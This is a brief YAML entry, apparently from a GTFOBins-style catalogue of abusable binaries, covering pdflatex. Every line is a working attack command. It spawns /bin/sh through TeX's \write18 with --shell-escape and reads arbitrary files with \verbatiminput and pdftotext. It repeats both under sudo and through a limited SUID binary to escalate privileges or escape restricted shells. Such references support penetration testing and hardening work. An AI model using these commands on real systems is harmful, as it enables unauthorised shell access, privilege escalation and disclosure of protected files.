---
functions:
  shell:
    - code: |
        pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
  file-read:
    - description: The read file will be part of the output.
      code: |
        pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
        pdftotext article.pdf -
  sudo:
    - description: The read file will be part of the output.
      code: |
        sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
        pdftotext article.pdf -
    - code: |
        sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
  limited-suid:
    - code: |
        ./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
---
